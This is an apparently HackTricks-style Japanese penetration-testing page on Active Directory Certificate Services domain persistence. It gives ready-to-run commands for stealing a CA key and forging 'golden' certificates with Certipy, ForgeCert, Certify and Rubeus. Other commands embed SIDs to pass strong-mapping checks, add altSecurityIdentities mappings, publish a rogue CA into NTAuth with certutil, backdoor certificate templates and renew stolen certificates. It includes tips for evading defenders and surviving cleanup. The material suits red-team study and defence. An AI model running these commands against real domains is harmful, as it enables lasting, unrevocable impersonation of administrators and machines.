# AD CS ドメイン永続化

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

証明書が CA 証明書であることはどのように判別できますか？

以下の条件がいくつか満たされていれば、証明書が CA 証明書であると判断できます:

- 証明書は CA サーバーに保存されており、秘密鍵はマシンの DPAPI、または OS が対応していれば TPM/HSM などのハードウェアで保護されている。
- 証明書の Issuer および Subject フィールドが CA の識別名 (distinguished name) と一致している。
- CA 証明書にのみ "CA Version" 拡張が存在する。
- 証明書に Extended Key Usage (EKU) フィールドがない。

この証明書の秘密鍵を抽出するには、CA サーバー上の `certsrv.msc` ツールを使用するのが組み込み GUI によるサポートされた方法です。とはいえ、この証明書はシステム内に保存されている他の証明書と本質的に異なるものではないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような方法で抽出することもできます。

証明書と秘密鍵は、Certipy を使用して次のコマンドでも取得できます:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA 証明書とその秘密鍵を `.pfx` 形式で入手したら、[ForgeCert](https://github.com/GhostPack/ForgeCert) のようなツールを使って有効な証明書を生成できます:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> certificate forgery の対象となるユーザーは Active Directory 上でアクティブかつ認証可能である必要があります。krbtgt のような特殊アカウントに対する certificate forgery は効果がありません。

この偽造された証明書は、指定された有効期限まで、またルート CA 証明書が有効である限り（通常は5年から**10年以上**）**有効**です。これは**machines**にも有効であるため、**S4U2Self** と組み合わせることで、攻撃者は CA 証明書が有効な限り、任意のドメインマシン上で**persistence を維持**できます。\
さらに、この方法で**生成された証明書**は CA がそれらを認識していないため、**取り消すことができません**。

### Strong Certificate Mapping Enforcement (2025+) 下での運用

2025年2月11日以降（KB5014754 の展開後）、domain controllers は証明書マッピングに対してデフォルトで **Full Enforcement** に設定されます。実務上、これはあなたの偽造証明書が次のいずれかを満たす必要があることを意味します:

- ターゲットアカウントへの強いバインディングを含む（例えば、SID セキュリティ拡張）、または
- ターゲットオブジェクトの `altSecurityIdentities` 属性に対して強い明示的マッピングと組み合わせること。

永続化の信頼できるアプローチは、盗まれた Enterprise CA にチェーンされた偽造証明書を mint し、被害者プリンシパルに強い明示的マッピングを追加することです:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注記
- SIDセキュリティ拡張を含む偽造証明書を作成できる場合、それらはFull Enforcement下でも暗黙的にマップされます。そうでない場合は、明示的かつ強力なマッピングを優先してください。明示的なマッピングの詳細は[account-persistence](account-persistence.md)を参照。
- ここでの失効は防御側の助けになりません: 偽造証明書はCAデータベースに存在しないため、失効させることができません。

#### Full-Enforcement 対応の偽造 (SID-aware)

更新されたツールにより、SIDを直接埋め込めるようになり、DCsが弱いマッピングを拒否してもgolden certificatesを使用可能なままにできます:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SIDを埋め込むことで、監視されている可能性がある `altSecurityIdentities` に触れる必要を避けつつ、強力なマッピングチェックを満たせます。

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` オブジェクトは、Active Directory (AD) が使用する `cacertificate` 属性に1つ以上の **CA certificates** を格納するよう定義されています。**domain controller** による検証では、認証対象の **certificate** の Issuer フィールドで指定された **CA specified** と一致するエントリが `NTAuthCertificates` オブジェクトにあるかを確認します。一致が見つかれば、認証は進行します。

攻撃者がこの AD オブジェクトを制御できる場合、自己署名の CA 証明書を `NTAuthCertificates` オブジェクトに追加できます。通常、このオブジェクトを変更できるのは **Enterprise Admin** グループのメンバー、または **forest root’s domain** の **Domain Admins** や **Administrators** のみです。`NTAuthCertificates` オブジェクトは `certutil.exe` を使って `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` のコマンドで編集するか、[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) を利用して行えます。

この手法に役立つ追加コマンド:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
この機能は、以前説明した ForgeCert を使い証明書を動的に生成する方法と組み合わせると特に有効です。

> Post-2025 のマッピングに関する考慮事項: NTAuth に不正な CA を置いても、発行元 CA の信頼が確立されるだけです。DC が **Full Enforcement** の場合にログオンに leaf certificate を使用するには、leaf に SID セキュリティ拡張が含まれているか、ターゲットオブジェクト上に明確な強力なマッピングが存在する必要があります（例: `altSecurityIdentities` の Issuer+Serial）。See {{#ref}}account-persistence.md{{#endref}}.

## 悪意のある誤設定 - DPERSIST3

AD CS コンポーネントの **セキュリティ記述子の変更** による **永続性** の機会は多数存在します。「[Domain Escalation](domain-escalation.md)」セクションで説明した変更は、権限を持つ攻撃者によって悪用される可能性があります。これには、次のような機密コンポーネントへの「コントロール権限」（例: WriteOwner/WriteDACL/etc.）の追加が含まれます:

- **CA サーバの AD コンピュータ** オブジェクト
- **CA サーバの RPC/DCOM サーバ**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 内の任意の **下位 AD オブジェクトまたはコンテナ**（例: Certificate Templates コンテナ、Certification Authorities コンテナ、NTAuthCertificates オブジェクトなど）
- 組織やデフォルトで **AD CS を制御する権限を委譲された AD グループ**（組み込みの Cert Publishers グループやそのメンバー等）

悪意ある実装の例としては、ドメインで **elevated permissions** を持つ攻撃者が、デフォルトの **`User`** 証明書テンプレートに **`WriteOwner`** 権限を追加し、権利のプリンシパルを攻撃者自身にする、というものがあります。これを悪用するには、攻撃者はまず **`User`** テンプレートの所有者を自分に変更します。次にテンプレートで **`mspki-certificate-name-flag`** を **1** に設定し **`ENROLLEE_SUPPLIES_SUBJECT`** を有効化して、リクエストで Subject Alternative Name を要求者が指定できるようにします。その後、攻撃者はその **テンプレート** を使って証明書を登録し、代替名として **ドメイン管理者** の名前を選択し、取得した証明書を DA としての認証に利用できます。

長期的なドメイン永続性のために攻撃者が設定しうる実務的なポイント（詳細と検出方法は {{#ref}}domain-escalation.md{{#endref}} を参照）:

- リクエスタからの SAN を許可する CA ポリシーフラグ（例: `EDITF_ATTRIBUTESUBJECTALTNAME2` を有効にする）。これにより ESC1 に類する経路が悪用可能なままになります。
- 認証可能な発行を許すテンプレートの DACL や設定（例: Client Authentication EKU を追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` を有効化）。
- 防御者がクリーンアップを試みた際に不正な発行者を再導入し続けられるよう、`NTAuthCertificates` オブジェクトや CA コンテナを制御する。

> [!TIP]
> KB5014754 適用後の強化環境では、これらの誤設定に明示的な強いマッピング（`altSecurityIdentities`）を組み合わせることで、DC が強いマッピングを強制している場合でも、発行または偽造した証明書を引き続き使用可能にできます。

### 証明書の更新悪用 (ESC14) による永続化

認証可能な証明書（または Enrollment Agent の証明書）を侵害した場合、発行テンプレートが公開されたままであり、CA が発行チェーンを信頼している限り、**それを無期限に更新する**ことが可能です。更新は元の識別バインディングを維持しつつ有効期限を延長するため、テンプレートが修正されるか CA が再公開されない限り、排除が困難になります。
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
ドメインコントローラーが**Full Enforcement**にある場合、`-sid <victim SID>` を追加する（または SID セキュリティ拡張を含むテンプレートを使用する）ことで、更新されたリーフ証明書が `altSecurityIdentities` に触れることなく引き続き強力にマッピングされるようにします。CA 管理者権限を持つ攻撃者は、`policy\RenewalValidityPeriodUnits` を調整して、自身で証明書を発行する前に更新後の有効期間を延長することもあります。


## 参考文献

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
